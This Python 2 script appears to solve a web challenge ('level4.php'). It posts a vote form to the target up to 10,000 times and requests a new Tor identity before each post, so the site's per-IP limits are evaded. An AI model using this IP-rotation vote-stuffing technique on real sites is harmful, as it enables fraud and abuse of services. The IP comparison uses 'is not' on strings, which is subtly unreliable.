import requesocks
import urllib2
from TorCtl import TorCtl
import ast

header = {'Cookie': 'HoldTheDoor='}
tmp_ip = 0
form = {'id': 46, 'holdthedoor': 'submit', 'key': '', 'Referer': 'http://173.246.108.142/level4.php'}

#Initialize a new wrapped requests object
session = requesocks.session()

proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
opener = urllib2.build_opener(proxy_support)

def newId():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="123")
    conn.send_signal("NEWNYM")

#Use Tor for both HTTP and HTTPS
session.proxies = {'http': 'socks5://127.0.0.1:9050',
                   'https': 'socks5://127.0.0.1:9050'}

session.headers.update({'Referer': 'http://173.246.108.142/level4.php'})

for i in range(10000):
    newId()
    proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
    urllib2.install_opener(opener)
    response = session.get('http://httpbin.org/ip')
    dict = ast.literal_eval(response.text)
    current_ip = dict.get("origin")

    if str(current_ip) is not str(tmp_ip):
        hodor = session.post('http://173.246.108.142/level4.php', data=form,
                             headers=header)
        tmp_ip = current_ip
        print(hodor.text)

    print "tmp_ip :" + str(tmp_ip)
    print "current_ip: " + str(current_ip)
